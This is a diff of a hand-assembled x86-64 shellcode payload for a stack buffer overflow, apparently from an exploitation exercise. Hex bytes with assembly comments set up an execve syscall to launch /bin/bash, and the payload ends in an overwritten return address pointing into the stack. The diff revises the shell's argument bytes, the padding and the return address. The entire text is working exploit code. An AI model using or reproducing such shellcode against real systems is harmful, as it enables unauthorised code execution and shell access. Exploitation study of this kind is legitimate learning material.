@@ -1,13 +1,11 @@
-2f 62 69 6e 2f 62 61 73
-68 00                              /* /bin/bash */
-2d 69 00                           /* -l */
-00 00 00 00 00 00 00 00            /* NULL BYTE to terminate array */
-
+2f 62 69 6e 2f 62 61 73            /* bin/bash, this addr will go in rdi */
+68 00 20 2d 69 00 00 00            /* -s */
+ca db ff ff ff 7f 00 00            /* PTR to -s, this addr will go in rsi */ 
+00 00 00 00 00 00 00 00            /* NULL Byte to end array */
 48 c7 c0 3b 00 00 00               /* mov    $0x3b, %rax */
 48 bf c0 db ff ff ff 7f 00 00      /* mov    <add>, %rdi */ 
 48 c7 c2 00 00 00 00               /* mov    $0x0,  %rdx */
-48 be ca db ff ff ff 7f 00 00      /* mov    <add>, %rsi */
+48 be d0 db ff ff ff 7f 00 00      /* mov    <add>, %rsi */
 0f 05                              /* syscall */
-90 90 90 90 90 90 90               /* pad */
-90 90 90 90 90 90 90 90            /* pad */
-d5 db ff ff ff 7f 00 00            /* ret address */
+00 00 00 00                        /* pad */
+e0 db ff ff ff 7f 00 00            /* ret address */
